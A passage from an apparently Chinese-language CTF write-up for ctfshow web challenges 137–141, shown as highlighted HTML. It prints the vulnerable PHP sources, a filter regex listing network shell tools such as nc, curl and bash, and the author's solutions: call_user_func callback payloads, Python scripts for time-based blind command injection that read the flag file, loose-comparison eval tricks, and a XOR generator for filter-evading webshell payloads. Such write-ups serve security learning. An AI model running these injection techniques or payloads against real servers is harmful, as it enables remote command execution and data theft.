constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfshow</span><span class="token punctuation">&#123;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"private class"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function-definition function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctfshow'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>call_user_func()，见了很多了，将传入的参数作为回调函数使用，这里只需要调用ctfshow类中的getFlag函数即可，所以</p><pre class="line-numbers language-none"><code class="language-none">payload:ctfshow&#x3D;ctfshow::getFlag在php中：-&gt;用来引用一个类的属性（变量）、方法（函数）&#x3D;&gt;是用来定义数组用的：：用来直接调用类中的属性或方法（不需要实例化的调用）$this-&gt;表示实例化后的具体对象 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="web138"><a href="#web138" class="headerlink" title="web138"></a>web138</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-10-13 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-10-16 22:52:13*/</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfshow</span><span class="token punctuation">&#123;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"private class"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function-definition function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strripos</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctfshow'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">":"</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"private function"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctfshow'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>过滤了::，通过call_user_func()可以传入数组进行绕过,举例如何用call_user_func()来调用一个类里面的方法</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">myclass</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function-definition function">say_hello</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Hello!\n"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$classname</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"myclass"</span><span class="token punctuation">;</span><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$classname</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'say_hello'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$classname</span> <span class="token operator">.</span><span class="token string single-quoted-string">'::say_hello'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// As of 5.2.3</span><span class="token variable">$myobject</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">myclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$myobject</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'say_hello'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">payload:ctfshow[0]&#x3D;ctfshow&amp;ctfshow[1]&#x3D;getFlag这样相当于：call_user_func(array(&quot;ctfshow&quot;, ‘getFlag’));调用了ctfshow类中的getFlag方法<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="web139"><a href="#web139" class="headerlink" title="web139"></a>web139</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">check</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\>|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i'</span><span class="token punctuation">,</span> <span class="token variable">$x</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'too young too simple sometimes naive!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看起来和136相同，但没有了写入权限，不能用tee了，本题需要通过盲注来做</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl<span class="token operator">=</span><span class="token string">"http://7b5658de-1c24-4882-9d46-8bbf2a122364.challenge.ctf.show:8080/?c="</span>re<span class="token operator">=</span><span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            k<span class="token operator">=</span><span class="token builtin">chr</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span>            <span class="token comment"># payload = f"if[`ls / | awk NR==&#123;i&#125; | cut -c &#123;j&#125;`==&#123;k&#125; ];then sleep 2;fi"</span>            <span class="token comment"># payload = "?c=" + f"if [ `ls / | awk NR==&#123;i&#125; | cut -c &#123;j&#125;` == &#123;k&#125; ];then sleep 2;fi"</span>            <span class="token comment"># print(payload)</span>            payload <span class="token operator">=</span><span class="token string">"if [ `ls / | awk NR==&#123;0&#125; | cut -c &#123;1&#125;` == &#123;2&#125; ];then sleep 2;fi"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token punctuation">,</span>k<span class="token punctuation">)</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">+</span>payload<span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">1.5</span><span class="token punctuation">,</span><span class="token number">1.5</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">except</span><span class="token punctuation">:</span>                re<span class="token operator">=</span>re<span class="token operator">+</span>k                <span class="token keyword">print</span><span class="token punctuation">(</span>re<span class="token punctuation">)</span>                <span class="token keyword">break</span>        re<span class="token operator">=</span>re<span class="token operator">+</span><span class="token string">" "</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这是得到flag存放位置的脚本，其中主要是payload需要注意，用到了shell编程</p><pre class="line-numbers language-none"><code class="language-none">if是判断，fi是if结束，[]里的是主要内容awk命令 awk是一种处理文本文件的语言，是一个强大的文本分析工具 其中NR是其内建变量，已经读出的记录数，就是行号，从1开始cut命令 cut是分割的命令，-c 是以字符为单位 进行分割这里的意思是对ls出来的每一行字符串的每一个字符进行if判断，该字符盲注成功的话就会sleep两秒，这样就会触发except，re就是我们想得到的值<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/images/image-20210531215201372.png"></p><p>该脚本得到上图，我们可以得到一个f149_15_h3r3文件，存放这外卖想要的flag，接下来只用改一下上面的脚本来跑flag就行了</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl<span class="token operator">=</span><span class="token string">"http://7b5658de-1c24-4882-9d46-8bbf2a122364.challenge.ctf.show:8080/?c="</span>re<span class="token operator">=</span><span class="token string">""</span><span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        k<span class="token operator">=</span><span class="token builtin">chr</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span>        <span class="token comment"># payload = f"if[`ls / | awk NR==&#123;i&#125; | cut -c &#123;j&#125;`==&#123;k&#125; ];then sleep 2;fi"</span>        <span class="token comment"># payload = "?c=" + f"if [ `ls / | awk NR==&#123;i&#125; | cut -c &#123;j&#125;` == &#123;k&#125; ];then sleep 2;fi"</span>        <span class="token comment"># print(payload)</span>        payload <span class="token operator">=</span><span class="token string">"if [ `cat /f149_15_h3r3 | cut -c &#123;0&#125;` == &#123;1&#125; ];then sleep 2;fi"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>j<span class="token punctuation">,</span>k<span class="token punctuation">)</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">+</span>payload<span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">1.5</span><span class="token punctuation">,</span><span class="token number">1.5</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            re<span class="token operator">=</span>re<span class="token operator">+</span>k            <span class="token keyword">print</span><span class="token punctuation">(</span>re<span class="token punctuation">)</span>            <span class="token keyword">break</span>        <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/images/image-20210531220631659.png">这里字符数少了点，重新跑没截图，因为过滤所以没有{}最后加上{}即可</p><p>这样直接来有的时候网不好容易出错，在payload前加一个time.sleep(0.1)有帮助     </p><h3 id="web140"><a href="#web140" class="headerlink" title="web140"></a>web140</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-10-13 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-10-17 12:39:25*/</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$f1</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$f2</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^[a-z0-9]+$/'</span><span class="token punctuation">,</span> <span class="token variable">$f1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^[a-z0-9]+$/'</span><span class="token punctuation">,</span> <span class="token variable">$f2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"return <span class="token interpolation"><span class="token variable">$f1</span></span>(<span class="token interpolation"><span class="token variable">$f2</span></span>());"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'ctfshow'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/images/image-20210531225804454.png"></p><p><img src="/images/image-20210531225817212.png"></p><p>用到了松散比较==的特性</p><pre class="line-numbers language-none"><code class="language-none">0和字符串进行弱比较的时候返回的是true，因为&#x3D;&#x3D;在进行比较的时候，会先将字符串类型转化成相同，再比较，而ctfshow是一个字符串，和0相比较的时候要转换成数字，ctfshow转换成数字的时候是0，所以相等返回true而intval()函数会将非数字或非数字字符串转换为0，所以$code需要为字符，也就是我们传入的f1和f2互相构造即可<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">可以使用如下：md5(phpinfo())md5(sleep())md5(md5())current(localeconv)sha1(getcwd())     因为&#x2F;var&#x2F;www&#x2F;html md5后开头的数字所以我们改用sha1usleep(usleep())<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="web141"><a href="#web141" class="headerlink" title="web141"></a>web141</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v3</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^\W+$/'</span><span class="token punctuation">,</span> <span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$code</span> <span class="token operator">=</span>  <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"return <span class="token interpolation"><span class="token variable">$v1</span></span><span class="token interpolation"><span class="token variable">$v3</span></span><span class="token interpolation"><span class="token variable">$v2</span></span>;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$v1</span></span><span class="token interpolation"><span class="token variable">$v3</span></span><span class="token interpolation"><span class="token variable">$v2</span></span> = "</span><span class="token operator">.</span><span class="token variable">$code</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>正则表达<code>/^\W+$/</code>，意味着ban掉了所有数字字母，这是一道无数字字母的webshell题，可以使用异或，取反等绕过，需要使用到脚本，这里自己在网上看了一下，学着写了一个用异或完成的，简单来说就是遍历字符表来异或，找到符合要求的记录下来，再输入想要的指令，在记录中遍历查找到 即可形成无数字字母的shell</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> re<span class="token comment">#异或无数字字母绕过</span><span class="token comment">#取得可用字符串放入文件</span><span class="token keyword">def</span> <span class="token function">get_xor_words</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    preg<span class="token operator">=</span><span class="token string">'[a-zA-Z0-9]'</span>    result<span class="token operator">=</span><span class="token string">''</span>    <span class="token comment">#遍历扩展ascii码表</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token keyword">not</span> <span class="token punctuation">(</span>re<span class="token punctuation">.</span><span class="token keyword">match</span><span class="token punctuation">(</span>preg<span class="token punctuation">,</span><span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span>re<span class="token punctuation">.</span>I<span class="token punctuation">)</span> <span class="token keyword">or</span> re<span class="token punctuation">.</span><span class="token keyword">match</span><span class="token punctuation">(</span>preg<span class="token punctuation">,</span><span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">,</span>re<span class="token punctuation">.</span>I<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                k<span class="token operator">=</span>i<span class="token operator">^</span>j                <span class="token comment">#k在可显示字符中</span>                <span class="token keyword">if</span> k<span class="token operator">>=</span><span class="token number">32</span> <span class="token keyword">and</span> k<span class="token operator">&lt;=</span><span class="token number">126</span><span class="token punctuation">:</span>                    <span class="token comment"># 以URL编码方式存储</span>                    a <span class="token operator">=</span> <span class="token string">'%'</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>zfill<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>                    b <span class="token operator">=</span> <span class="token string">'%'</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>zfill<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>                    result <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">' '</span> <span class="token operator">+</span> a <span class="token operator">+</span> <span class="token string">' '</span> <span class="token operator">+</span> b <span class="token operator">+</span> <span class="token string">'\n'</span><span class="token punctuation">)</span>    f<span class="token operator">=</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'xor_file.txt'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">)</span>    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token comment">#通过输入的命令获取无数字字母命令</span><span class="token keyword">def</span> <span class="token function">get_order</span><span class="token punctuation">(</span>arg<span class="token punctuation">)</span><span class="token punctuation">:</span>    s1 <span class="token operator">=</span> <span class="token string">""</span>    s2 <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> arg<span class="token punctuation">:</span>        f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"xor_file.txt"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            t <span class="token operator">=</span> f<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> t <span class="token operator">==</span> <span class="token string">""</span><span class="token punctuation">:</span>                <span class="token keyword">break</span>            <span class="token keyword">if</span> t<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> i<span class="token punctuation">:</span>                s1 <span class="token operator">+=</span> t<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">]</span>                s2 <span class="token operator">+=</span> t<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">]</span>                <span class="token keyword">break</span>        f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token comment">#异或后存入</span>    output <span class="token operator">=</span> <span class="token string">"(\""</span> <span class="token operator">+</span> s1 <span class="token operator">+</span> <span class="token string">"\"^\""</span> <span class="token operator">+</span> s2 <span class="token operator">+</span> <span class="token string">"\")"</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>output<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    get_xor_words<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        s1 <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"\n[+] your function："</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> s1 <span class="token operator">==</span> <span class="token string">"exit"</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>        s2 <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"[+] your command："</span><span class="token punctuation">)</span>        param <span class="token operator">=</span> get_order<span class="token punctuation">(</span>s1<span class="token punctuation">)</span> <span class="token operator">+</span> get_order<span class="token punctuation">(</span>s2<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\n[*] result:\n"</span> <span class="token operator">+</span> param<span class="token operator">+</span><span class="token string">";"</span><span class="token punctuation">)</span>main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" 